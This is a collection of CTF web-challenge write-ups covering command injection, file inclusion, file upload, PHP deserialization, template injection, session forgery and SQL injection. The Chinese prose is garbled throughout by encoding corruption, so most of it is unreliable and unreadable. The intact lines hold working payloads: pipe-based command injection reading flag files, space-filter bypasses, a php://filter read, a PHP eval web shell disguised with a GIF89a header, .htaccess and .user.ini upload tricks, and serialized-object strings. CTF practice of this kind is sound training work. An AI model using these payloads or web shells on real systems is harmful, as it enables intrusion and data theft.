è¡¨ç¤ºå½“å‰ç›®å½•../ è¡¨ç¤ºçˆ¶çº§ç›®å½•/ è¡¨ç¤ºæ ¹ç›®å½• ç›®å½•éå†å¸¸è§çš„æ˜¯ä½¿ç”¨../æ¥éå†ç›®å½• phpinfoè¿›å…¥åä¸ºè¿™ç§é¡µé¢ ä»”ç»†æŸ¥æ‰¾åå¯å‘ç°flag å¤‡ä»½æ–‡ä»¶ä¸‹è½½-ç½‘ç«™æºç  1.ä¾æ¬¡è¯•è¯•å‘ç°å­˜åœ¨www.zip,ä¸‹è½½å‹ç¼©åŒ…åå‘ç°å­˜åœ¨ä¸‰ä¸ªæ–‡ä»¶ æŸ¥çœ‹flagçš„æ–‡ä»¶åå‘ç°å…¶ä¸­ä¸å­˜åœ¨flag å°è¯•åœ¨ç½‘é¡µä¸­è®¿é—®å¾—åˆ°flag 2.å¾¡å‰‘æ‰«æ 3.åˆ©ç”¨dirsearchå·¥å…·æ‰«æ python dirsearch.py -u http://challenge-c5753b902359b43f.sandbox.ctfhub.com:10080/ -e* bakæ–‡ä»¶è¿›å…¥é¡µé¢å äºæ˜¯æŸ¥çœ‹/index.php.bak å¾—åˆ°æ–‡ä»¶ vimç¼“å­˜ æ‰€ä»¥æŸ¥çœ‹.index.php.swpå¯å¾—åˆ°æ–‡ä»¶ ä¹‹ååœ¨Linuxç³»ç»Ÿä¸­ç”¨å‘½ä»¤ vim -r index.php.swpæ‰“å¼€ .DS_Storeæ ¹æ®é¢˜ç›®æŸ¥çœ‹åç¼€.DS_Store å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ ç”¨è®°äº‹æœ¬å°±å¯ä»¥æŸ¥çœ‹çœ‹åˆ° å¯å¾—åˆ°flag gitæ³„éœ² logé¢˜ç›®ä¸­ä¸ºgitæ³„éœ²å¯ç›´æ¥åœ¨åç¼€ååŠ /.git ä¹Ÿå¯ç”¨dirsearchæ‰« ç”¨githackè¿›è¡ŒæŸ¥çœ‹ï¼ˆç™¾åº¦é‡Œæœ‰å‡ ä¸ªgithackæ²¡æœ‰åŠæ³•ç”¨ï¼Œå¼„äº†ä¸€ä¸‹åˆï¼‰ githackè¦ç”¨python2 å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹è¿›å…¥åç”¨git bashæ‰“å¼€ åˆ©ç”¨git logå¯ä»¥æŸ¥çœ‹å†å²æäº¤è®°å½• çœ‹åˆ°æœ‰init ï¼Œadd flagï¼Œremove flagä¸‰æ¬¡æäº¤è®°å½• çŒœæµ‹flagåœ¨add flagä¸­ï¼Œç”¨git diffå‘½ä»¤å¯¹æ¯”ä¸add flagçš„å·®åˆ«ï¼Œå¯å¾—åˆ°flagï¼› [ACTF2020 æ–°ç”Ÿèµ›]ExecæŸ¥çœ‹æºç åä¸å­˜åœ¨æç¤ºï¼Œå°è¯•ping 127.0.0.1 pingé€šåå†å°è¯•ping 127.0.0.1|ls çœ‹åˆ°index.php å¤šæ¬¡ç”¨../æŸ¥çœ‹ä¸Šçº§ç›®å½• çœ‹è§æœ‰flagæ–‡ä»¶ å°è¯•æŸ¥çœ‹127.0.0.1|cat ../../../flag å¾—åˆ°flag ä¹Ÿå¯ä»¥ç”¨cat /flag é¢˜ç›®åˆ©ç”¨äº†å‘½ä»¤æ‰§è¡Œ ç®¡é“ç¬¦ 1ã€|ï¼ˆå°±æ˜¯æŒ‰ä½æˆ–ï¼‰ï¼Œç›´æ¥æ‰§è¡Œ|åé¢çš„è¯­å¥ 2ã€||ï¼ˆå°±æ˜¯é€»è¾‘æˆ–ï¼‰ï¼Œå¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥ 3ã€&amp;ï¼ˆå°±æ˜¯æŒ‰ä½ä¸ï¼‰ï¼Œ&amp;å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡ 4ã€&amp;&amp;ï¼ˆå°±æ˜¯é€»è¾‘ä¸ï¼‰ï¼Œå¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤ 5ã€Linuxä¸­ ; å‰åéƒ½æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡ï¼ŒåŒ&amp;ï¼Œ [ACTF2020 æ–°ç”Ÿèµ›]Includeé¢˜ç›®æ˜¯includeçŒœæµ‹æ˜¯æ–‡ä»¶åŒ…å«ï¼› ç‚¹å‡»tipsåè·³è½¬åˆ°äº†file=flag.php ç”¨php://inputæ—¶æç¤º ç„¶åå°è¯•ç”¨php://filter æ„é€ payload ?file=php://filter/read=convert.base64-encode/resource=flag.php æœ€åç”¨base64è§£ç å°±èƒ½å¾—åˆ°flag [æå®¢å¤§æŒ‘æˆ˜ 2019]Knifeæ–‡ä»¶å¯ä¸Šä¼ çŸ¥é“æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„ä¸Šä¼ æ–‡ä»¶å¯ä»¥è¢«è®¿é—®ä¸Šä¼ æ–‡ä»¶å¯ä»¥è¢«æ‰§è¡Œ è¿›å»çœ‹åˆ°è¿™ä¸ªç•Œé¢æ„Ÿè§‰æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨èœåˆ€è¿æ¥ è¯•ä¸€ä¸‹ è¿æ¥æˆåŠŸ ç„¶ååœ¨æ ¹ç›®å½•ä¸‹å‘ç°flagçš„æ–‡ä»¶ï¼Œè¿›å…¥åæ‰¾åˆ°flag [æå®¢å¤§æŒ‘æˆ˜ 2019]Httpè¿›å»åçœ‹åˆ°æ˜¯ä¸ªå¹¿å‘Šé¡µï¼Œç›´æ¥æŸ¥çœ‹æºç  å‘ç°æœ‰ä¸ªSecret.phpï¼Œè¿›å…¥ä¹‹å ç”¨bpæŠ“åŒ…ç„¶åå…ˆåŠ ä¸ªReferer: https://www.Sycsecret.com çœ‹åˆ°è¦ç”¨Syclover æµè§ˆå™¨ æ‰€ä»¥æŠŠUser-Agenté‡Œçš„å†…å®¹æ”¹æˆUser-Agent: Syclover æç¤ºè¦æœ¬åœ°è®¿é—® æ‰€ä»¥åŠ ä¸ªX-Forwarded-For:127.0.0.1ï¼ˆæˆ‘ä¸‹äº†ä¸ªfakeipçš„æ’ä»¶ï¼‰ httpè¯·æ±‚æŠ¥å¤´è¯·æ±‚æŠ¥å¤´é€šçŸ¥æœåŠ¡å™¨å…³äºå®¢æˆ·ç«¯æ±‚æ±‚çš„ä¿¡æ¯ï¼Œå…¸å‹çš„è¯·æ±‚å¤´æœ‰ï¼š X-Forwarded-For æ˜¯ä¸€ä¸ª HTTP æ‰©å±•å¤´éƒ¨ã€‚ç”¨æ¥è¡¨ç¤º HTTP è¯·æ±‚ç«¯çœŸå® IPã€‚ Refererï¼šè¡¨ç¤ºè¿™æ˜¯è¯·æ±‚æ˜¯ä»å“ªä¸ªURLè¿›æ¥çš„ Hostï¼šè¯·æ±‚çš„ä¸»æœºåï¼Œå…è®¸å¤šä¸ªåŸŸååŒå¤„ä¸€ä¸ªIPåœ°å€ï¼Œå³è™šæ‹Ÿä¸»æœº User-Agentï¼šå‘é€è¯·æ±‚çš„æµè§ˆå™¨ç±»å‹ã€æ“ä½œç³»ç»Ÿç­‰ä¿¡æ¯ Acceptï¼šå®¢æˆ·ç«¯å¯è¯†åˆ«çš„å†…å®¹ç±»å‹åˆ—è¡¨ï¼Œç”¨äºæŒ‡å®šå®¢æˆ·ç«¯æ¥æ”¶é‚£äº›ç±»å‹çš„ä¿¡æ¯ Accept-Encodingï¼šå®¢æˆ·ç«¯å¯è¯†åˆ«çš„æ•°æ®ç¼–ç  Accept-Languageï¼šè¡¨ç¤ºæµè§ˆå™¨æ‰€æ”¯æŒçš„è¯­è¨€ç±»å‹ Connectionï¼šå…è®¸å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨æŒ‡å®šä¸è¯·æ±‚/å“åº”è¿æ¥æœ‰å…³çš„é€‰é¡¹ï¼Œä¾‹å¦‚è¿™æ˜¯ä¸ºKeep-Aliveåˆ™è¡¨ç¤ºä¿æŒè¿æ¥ã€‚ Transfer-Encodingï¼šå‘ŠçŸ¥æ¥æ”¶ç«¯ä¸ºäº†ä¿è¯æŠ¥æ–‡çš„å¯é ä¼ è¾“ï¼Œå¯¹æŠ¥æ–‡é‡‡ç”¨äº†ä»€ä¹ˆç¼–ç æ–¹å¼ã€‚ [GXYCTF2019]Ping Ping Pingè¿›å…¥åå…ˆæ ¹æ®é¢˜ç›®è¯•ä¸€ä¸‹?ip=127.0.0.1 å†ç”¨lsæŸ¥çœ‹å‘ç°å­˜åœ¨flag.phpå’Œindex.phpä¸¤ä¸ªæ–‡ä»¶ å°è¯•ç›´æ¥æŸ¥çœ‹flag.phpå‘ç°ç©ºæ ¼è¢«è¿‡æ»¤ ç»•è¿‡ç©ºæ ¼æ–¹å¼ $&#123;IFS&#125;æ›¿æ¢ $IFS$1æ›¿æ¢ $&#123;IFSæ›¿æ¢ %20æ›¿æ¢ &lt;å’Œ&lt;&gt;é‡å®šå‘ç¬¦æ›¿æ¢ %09æ›¿æ¢ $IFSæ˜¯bashä¸­çš„å†…éƒ¨åŸŸåˆ†éš”ç¬¦ï¼Œå¯ä»¥ä»£æ›¿ç©ºæ ¼è‡³äºåé¢çš„$9æ•°å­—æ˜¯å¯ä»¥éšæ„çš„ å‘ç°åˆ©ç”¨$IFS$1å¯ä»¥ç»•è¿‡ï¼Œä½†flagä¹Ÿè¢«è¿‡æ»¤äº† äºæ˜¯å…ˆæŸ¥çœ‹index.php ç™¾åº¦ä¹‹åæ‰¾åˆ°ä¸€ç§åˆ©ç”¨å†…è”çš„payload ?ip=127.0.0.1;cat$IFS$1 ls å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œ GXYCTF2019]Ping Ping Ping åšé¢˜æ€»ç»“_å­™å¾—åŠ²çš„åšå®¢-CSDNåšå®¢ [GXYCTF2019]Ping Ping Ping {å‘½ä»¤æ‰§è¡Œæ€»ç»“}_æ˜‚é¦–ä¸‹æ¥¼æ¢¯çš„åšå®¢-CSDNåšå®¢ ä¸€äº›å…¶ä»–çš„ç»•è¿‡æ–¹å¼ [RoarCTF 2019]Easy Calcè¿›å…¥åæ˜¯ä¸ªè®¡ç®—å™¨ï¼ŒæŸ¥çœ‹æºç åå‘ç° æŸ¥çœ‹calc.phpçœ‹åˆ°phpä»£ç  çœ‹åˆ°è¿‡æ»¤æ‰äº†å¾ˆå¤šå­—ç¬¦ å°è¯•ä¼ å…¥å‚æ•°å‘ç°ä»…èƒ½ä¼ å…¥æ•°å­— ç™¾åº¦åå¾—çŸ¥è¿™é‡Œè®¾ç½®äº†waf å¯ä»¥åˆ©ç”¨phpåœ¨è§£æå­—ç¬¦ä¸²æ—¶ä¼šåˆ é™¤ç©ºç™½ç¬¦å¹¶å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿çš„ç‰¹æ€§ç»•è¿‡ æ‰€ä»¥å°è¯•åœ¨numå‰åŠ ç©ºæ ¼ ç»•è¿‡æˆåŠŸ æ¥ä¸‹æ¥å°è¯•æ„é€ å‘½ä»¤å¾—åˆ°flag åˆ©ç”¨scandirå‡½æ•°å¯è¯»å–ç›®å½• ç”±äº/è¢«è¿‡æ»¤ æ‰€ä»¥åˆ©ç”¨chrå‡½æ•°ç»•è¿‡ æ„é€  [node3.buuoj.cn:26183/calc.php? num=print_r(scandir(chr(47)))](http://node3.buuoj.cn:26183/calc.php? num=print_r(scandir(chr(47)) å¾—åˆ° çœ‹åˆ°æœ‰ä¸ªf1agg åˆ©ç”¨readfileæˆ–è€…file_get_contentsæŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶ ? num=print_r(file_get_contents(chr(47).f1agg)) [æå®¢å¤§æŒ‘æˆ˜ 2019]Uploadå…ˆåšä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œä¸Šä¼ åæ˜¾ç¤º ç”¨bpæŠ“åŒ…ç„¶åä¿®æ”¹Content-Typeä¸ºimage/jpeg Content-Typeï¼ˆå†…å®¹ç±»å‹ï¼‰ï¼Œä¸€èˆ¬æ˜¯æŒ‡ç½‘é¡µä¸­å­˜åœ¨çš„ Content-Typeï¼Œç”¨äºå®šä¹‰ç½‘ç»œæ–‡ä»¶çš„ç±»å‹å’Œç½‘é¡µçš„ç¼–ç ï¼Œå†³å®šæµè§ˆå™¨å°†ä»¥ä»€ä¹ˆå½¢å¼ã€ä»€ä¹ˆç¼–ç è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œ æ”¾åŒ…ååˆæ˜¾ç¤ºä¸èƒ½ä¸ºphp ç™¾åº¦å¾—çŸ¥ç»•è¿‡åç¼€çš„æœ‰æ–‡ä»¶æ ¼å¼æœ‰php, ,php4,php5,phtml.pht è¯•ä¸€è¯• å‘ç°å¯ç”¨phtmlç»•è¿‡ ä½†åˆæç¤º æŠŠæ–‡ä»¶å†…å®¹æ”¹ä¸º åˆæç¤º åœ¨ä¸€å¥è¯æœ¨é©¬å‰åŠ ä¸ªæ–‡ä»¶å¤´GIF89a(GIF89aå›¾ç‰‡å¤´æ–‡ä»¶æ¬ºéª—) Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.phtml&quot;Content-Type: image/jpeg GIF89a @eval($_POST[\"a\"]); ä¸Šä¼ æˆåŠŸ çŒœæµ‹ä¸Šä¼ åœ°å€ä¸º/upload/ èœåˆ€è¿æ¥ åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag [ACTF2020 æ–°ç”Ÿèµ›]Uploadæ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆä¼ ä¸ªä¸€å¥è¯æœ¨é©¬è¯•è¯• å¼¹å‡ºjsï¼Œ çœ‹ä¸€ä¸‹æºç  æŠŠè¿™ä¸ªäº‹ä»¶removeæ‰ ä¸Šä¼ ååˆæç¤º è¯•è¯•æ”¹æ”¹åç¼€åï¼Œå‘ç°phtmlå¯ä»¥æˆåŠŸä¸Šä¼  èœåˆ€è¿æ¥ åœ¨è™šæ‹Ÿç»ˆç«¯ä¸­åˆ©ç”¨catå‘½ä»¤æ‰¾åˆ°flag [ACTF2020 æ–°ç”Ÿèµ›]BackupFileæ ¹æ®é¢˜ç›®å¾—çŸ¥æœ‰.bakçš„å¤‡ä»½æ–‡ä»¶ï¼Œè®¿é—®ä¸€ä¸‹index.php.bakå¾—åˆ°å¤‡ä»½æ–‡ä»¶ ä»£ç å®¡è®¡å¯çŸ¥è¦ä¼ å…¥keyçš„å€¼ä¸strçš„å€¼ç›¸ç­‰ï¼Œä¸”keyåªèƒ½ä¸ºæ•°å­—ç±»å‹ å› ä¸º==æ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œæ ¹æ®phpçš„æ€§è´¨å¯ä¼ å…¥?key=123 å¾—åˆ°flag [æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlagåˆ°payflagçš„é¡µé¢å‘ç°æœ‰ä¸¤ä¸ªæ¡ä»¶ æŸ¥çœ‹æºç  æŠ“ä¸ªåŒ… å°†useræ”¹ä¸º1å¯æ»¡è¶³ç¬¬ä¸€ä¸ªæ¡ä»¶ ä¹‹åè¦ä»¥postæ–¹å¼ä¼ å…¥ä¸€ä¸ªå€¼ä»¤å…¶ç­‰äº404ä¸”ä¸èƒ½ä¸ºçº¯æ•°å­— æ‰€ä»¥post password=404a æç¤ºè¦pay for the flag çŒœæµ‹è¦postè¿›money=100000000 ä¼ å…¥åæç¤ºæ•°å­—è¿‡é•¿ é‡‡ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼Œå¾—åˆ°flag [SUCTF 2019]CheckInè¿›å…¥åçœ‹èµ·æ¥åƒæ˜¯ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬çš„é¢˜ å…ˆä¼ ä¸€ä¸ªæ­£å¸¸çš„ æç¤ºillegal suffix!éæ³•åç¼€ æ”¹ä¸ªåç¼€åè¯•è¯• æ”¹æˆ.jpgæ–‡ä»¶åæˆåŠŸç»•è¿‡ï¼Œä½†åˆæç¤º&lt;? in contents! çŒœæµ‹&lt;?è¢«è¿‡æ»¤äº† ä¿®æ”¹å æœ€åå†åŠ ä¸ªGIF89aæ–‡ä»¶å¤´ï¼Œç»•è¿‡æœ€åä¸€ä¸ªexif_imagetypeå‡½æ•°çš„æ£€æµ‹ è™½ç„¶æˆåŠŸä¸Šä¼ äº†ä½†èœåˆ€æ— æ³•è¿æ¥ ç™¾åº¦ä¸€ä¸‹wp .user.ini 1ã€auto_prepend_file åœ¨é¡µé¢é¡¶éƒ¨åŠ è½½æ–‡ä»¶ 2ã€auto_append_file åœ¨é¡µé¢åº•éƒ¨åŠ è½½æ–‡ä»¶ æŸç½‘ç«™é™åˆ¶ä¸å…è®¸ä¸Šä¼ .phpæ–‡ä»¶ï¼Œå¯ä»¥ä¸Šä¼ ä¸€ä¸ª.user.iniï¼Œå†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼ŒåŒ…å«èµ·æ¥è¿›è¡Œgetshellã€‚åœ¨å«æœ‰.user.iniçš„æ–‡ä»¶å¤¹ä¸‹è¦æœ‰æ­£å¸¸çš„phpæ–‡ä»¶ å†ä¸Šä¼ ä¸€ä¸ª.user.ini ä¸Šä¼ åæˆ‘ä»¬è®¿é—®æ­¤ç›®å½•ä¸‹çš„ä»»ä½•ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå»åŒ…å«first.jpg, æ ¹æ®å…¶è¿”å›çš„åœ°å€ç”¨èœåˆ€è¿æ¥ æ‰¾åˆ°flag [ZJCTF 2019]NiZhuanSiWei çœ‹è§file_get_contents(),åˆ©ç”¨ä¼ªåè®®data://text/plain;base64ç»•è¿‡ å†åˆ©ç”¨php://filterè¯»å–uselesså†…çš„å†…å®¹ è§£ç å å¯çŸ¥flagåœ¨flag.phpä¸­ è¯•å›¾è®©file=flag.php çœ‹åˆ°unserializeå‡½æ•°ï¼Œåˆ©ç”¨phpååºåˆ—åŒ– æ„é€ payload ï¼Ÿtext=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} æŸ¥çœ‹æºç æ‰¾åˆ°flag [æå®¢å¤§æŒ‘æˆ˜ 2019]PHPé¡µé¢ä¸­æç¤ºæœ‰å¤‡ä»½æ–‡ä»¶ï¼Œå¾¡å‰‘æ‰«ä¸€é æ‰¾åˆ°å­˜åœ¨www.zip é‡ç‚¹åœ¨class.phpå’Œindex.phpä¸­ æ‰€ä»¥è¦ä¼ å…¥ä¸€ä¸ªselectå‚æ•°ï¼Œåˆ©ç”¨ååºåˆ—åŒ–è®©username=admin password=100 å› ä¸ºusernameå’Œpasswordä¸¤ä¸ªä¸ºprivateç±»å‹ æ‰€ä»¥æœ‰éšè—çš„ç©ºæ ¼ç¬¦ select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot; [MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢å…ˆä¼ ä¸ª.htaccessæ–‡ä»¶ï¼Œä¸ºäº†è§£æå›¾ç‰‡ç  htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚ ç¬¼ç»Ÿåœ°è¯´ï¼Œ.htaccesså¯ä»¥å¸®æˆ‘ä»¬å®ç°åŒ…æ‹¬ï¼šæ–‡ä»¶å¤¹å¯†ç ä¿æŠ¤ã€ç”¨æˆ·è‡ªåŠ¨é‡å®šå‘ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€æ”¹å˜ä½ çš„æ–‡ä»¶æ‰©å±•åã€å°ç¦ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€åªå…è®¸ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸ºindexæ–‡ä»¶ç­‰ä¸€äº›åŠŸèƒ½ã€‚ SetHandler application&#x2F;x-httpd-php &#x2F;&#x2F;è¯¥è¯­å¥ä½œç”¨æ˜¯è®©Apacheå°†å…¶ä»–ç±»å‹æ–‡ä»¶å‡ä»¥phpæ ¼å¼è§£æ å†ä¼ ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åbpæŠ“åŒ… åªæœ‰å°†å…¶æ”¹ä¸ºå›¾ç‰‡çš„ç±»å‹æ‰èƒ½æˆåŠŸä¸Šä¼  æ ¹æ®è¿”å›çš„è·¯å¾„ç”¨èœåˆ€è¿æ¥ [MRCTF2020]Ez_bypassè¿›å…¥åä»£ç å®¡è®¡ å…ˆgetè¿›ä¸¤ä¸ªmd5å€¼ç›¸ç­‰çš„å†…å®¹ md5æ— æ³•å¤„ç†æ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œä½¿å…¶ç›¸ç­‰ å†æ ¹æ®phpçš„ç‰¹æ€§postè¿›passwd=1234567aç»•è¿‡if è·å¾—flag [æŠ¤ç½‘æ¯ 2018]easy_tornadoä»æç¤ºå¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªtornadoæ˜¯ä¸€ä¸ªpythonçš„æ¨¡æ¿ï¼Œåœ¨webä½¿ç”¨çš„æ—¶å€™ç»™å‡ºäº†å››ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥è®¿é—®ï¼Œä»æç¤ºä¸­å’Œurlä¸­å¯ä»¥çœ‹å‡ºï¼Œè®¿é—®éœ€è¦æ–‡ä»¶å+æ–‡ä»¶ç­¾åï¼ˆé•¿åº¦ä¸º32ä½ï¼Œè®¡ç®—æ–¹å¼ä¸ºmd5(cookie_secret + md5(filename))ï¼‰; flagæ–‡ä»¶åé¢˜ç›®å·²ç»™å‡º /fllllllllllag æ‰€ä»¥è¦åšçš„å°±æ˜¯è¦è·å¾—åˆ°cookieå€¼ è¿™é‡Œæ˜¯é‡‡ç”¨æ¨¡æ¿æ³¨å…¥çš„æ–¹å¼ è¿™é‡Œå¯ä»¥çŒœå‡ºæ¥å­˜åœ¨æ¨¡æ¿æ³¨å…¥æ¼æ´è€Œä¸”åº”è¯¥å­˜åœ¨è¿‡æ»¤ ç„¶åç™¾åº¦çœ‹ä¸€ä¸‹wp åœ¨Tornadoçš„å‰ç«¯é¡µé¢æ¨¡æ¿ä¸­ï¼ŒTornadoæä¾›äº†ä¸€äº›å¯¹è±¡åˆ«åæ¥å¿«é€Ÿè®¿é—®å¯¹è±¡ï¼Œå…·ä½“å®šä¹‰å¯ä»¥[å‚è€ƒTornadoå®˜æ–¹æ–‡æ¡£](http:&#x2F;&#x2F;tornado.readthedocs.org&#x2F;en&#x2F;latest&#x2F;guide&#x2F;templates.html#template-syntax)ï¼ æ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥è¯»å–cookie_secret ç„¶åå¯¹å…¶è¿›è¡Œmd5åŠ å¯†å°±èƒ½å¾—åˆ°flagäº† [HCTF 2018]adminHCTF2018-admin_è¿·é£å°ç™½-CSDNåšå®¢ æ³¨å†Œä¸ªè´¦æˆ·ç™»å½•åå¯ä»¥åœ¨ä¿®æ”¹å¯†ç é¡µé¢çš„æºç æ³¨é‡Šä¸­æ‰¾åˆ°æç¤º æŸ¥çœ‹å¯ä»¥æ‰¾åˆ°é¢˜ç›®æºç  ä¸€ã€ sessionä¼ªé€  flaskä¸­sessionæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯cookieä¸­çš„ï¼Œä¹Ÿå°±æ˜¯å­˜å‚¨åœ¨æœ¬åœ°ã€‚flaskä»…ä»…å¯¹æ•°æ®è¿›è¡Œäº†ç­¾åã€‚ä¼—æ‰€å‘¨çŸ¥çš„æ˜¯ï¼Œç­¾åçš„ä½œç”¨æ˜¯é˜²ç¯¡æ”¹ï¼Œè€Œæ— æ³•é˜²æ­¢è¢«è¯»å–ã€‚è€Œflaskå¹¶æ²¡æœ‰æä¾›åŠ å¯†æ“ä½œï¼Œæ‰€ä»¥å…¶sessionçš„å…¨éƒ¨å†…å®¹éƒ½æ˜¯å¯ä»¥åœ¨å®¢æˆ·ç«¯è¯»å–çš„ æ‰¾åˆ°sessionååˆ©ç”¨pyè„šæœ¬è¿›è¡Œè§£ç  ä¾ç…§é¢˜æ„å¯ä»¥çŒœæµ‹åªæœ‰ç”¨adminè´¦æˆ·ç™»å½•æ‰èƒ½å¾—åˆ°flagï¼Œæ‰€ä»¥è¦ä¼ªé€ sessionæ¥ä½¿æˆ‘ä»¬è¢«è®¤ä¸ºæ˜¯adminè´¦æˆ· é‡æ–°ç¼–ç sessionæ—¶éœ€è¦ç”¨åˆ°secret_keyå¯ä»¥åœ¨config.pyä¸­æ‰¾åˆ° ä¼ªé€ session ä¿®æ”¹ååˆ·æ–°é¡µé¢å¾—åˆ°flag äºŒï¼šUnicodeæ¬ºéª— ä»£ç å®¡è®¡å¯ä»¥çœ‹å‡ºåœ¨ç™»å½•æ³¨å†Œå’Œä¿®æ”¹å¯†ç æ—¶éƒ½å­˜åœ¨ç”¨æˆ·åçš„å°å†™è½¬æ¢ çœ‹ä¸€ä¸‹strlower Twistedç‰ˆæœ¬ä¸º10.2.0ï¼Œè€Œç›®å‰(2020/10/28)Twistedæœ€æ–°ç‰ˆæœ¬å·²æœ‰20.3.0ï¼Œè¿™é‡Œä½¿ç”¨çš„ç‰ˆæœ¬éå¸¸æ—§10.2.0ç‰ˆçš„nodeprep.prepare()å¯¹ä¸€äº›ç‰¹æ®Šçš„Unicodeç¼–ç å¤„ç†åä¼šå¾—åˆ°ä¸€ä¸ªæ­£å¸¸çš„å­—ç¬¦ã€‚å¯ä»¥çŸ¥é“å½“ä½¿ç”¨äº†nodeprep.prepare()å‡½æ•°ä¹‹åï¼Œå¦‚æœæˆ‘ä»¬å…ˆä½¿ç”¨unicodeçš„ç¼–ç çš„å­—ç¬¦ï¼Œæ¯”å¦‚è¯´ á´¬ ï¼Œä½¿ç”¨è¯¥å‡½æ•°ä¹‹åï¼Œä»–ä¼šå…ˆå˜æˆå¤§å†™çš„Aï¼Œå†ä½¿ç”¨ä¸€æ¬¡å°±ä¼šå˜æˆå°å†™çš„aã€‚ æ‰€ä»¥å¯ä»¥æ³¨å†Œä¸€ä¸ªá´¬á´°á´¹á´µá´ºç”¨æˆ·å†é€šè¿‡ç™»å½•å’Œä¿®æ”¹å¯†ç ä¸¤æ¬¡ä»¤å…¶å˜ä¸ºadmin Basic Latin â€” âœ”ï¸ â¤ï¸ â˜… Unicode Character Table (unicode-table.com)å¯ä»¥ä»è¿™ä¸ªç½‘ç«™æŸ¥å­—ç¬¦ è¿™é‡Œç™»å½•ä¹‹åè¿›è¡Œä¿®æ”¹å¯†ç ï¼Œåˆ™é€šè¿‡å°å†™è½¬æ¢å°±ä¼šå˜ä¸ºä¿®æ”¹adminè´¦æˆ·çš„å¯†ç  ä¸‰ã€å¼±å¯†ç  ç”¨æˆ·adminå¯†ç ä¸º123 çˆ†ç ´æˆ–è€…è¯•ä¸€è¯•å°±èƒ½è¯•å‡ºæ¥å¯†ç  [BJDCTF2020]Easy MD5è¿›å…¥ååªæœ‰ä¸€ä¸ªæäº¤æ¡†ï¼Œæ²¡å•¥æ€è·¯ï¼Œå…ˆç”¨bpæŠ“ä¸ªåŒ… çœ‹è§æœ‰ä¸ªhint select * from &#39;admin&#39; where password=md5($pass,true) ç„¶åçŒœè¿™é‡Œåº”è¯¥è¦åˆ©ç”¨sqlæ³¨å…¥çš„ï¼Œä½†æˆ‘ä¸ä¼šäº†x çœ‹äº†ä¸€ä¸‹è¯´æ˜¯è¦ç”¨ffifdyopæ¥ç»•è¿‡ï¼Œå› ä¸ºè¿™ä¸ªå­—ç¬¦ä¸²ç»è¿‡md5ä¹‹åä¼šå˜æˆ 276f722736c95d99e921722cf9ed621cï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å‰å‡ ä½åˆšå¥½æ˜¯&#39; or &#39;6 å°±ä¼šæ„æˆä¸‡èƒ½å¯†ç  æˆåŠŸè¿›å…¥ä¸‹ä¸€æ­¥ï¼Œå…ˆæŸ¥çœ‹æºç  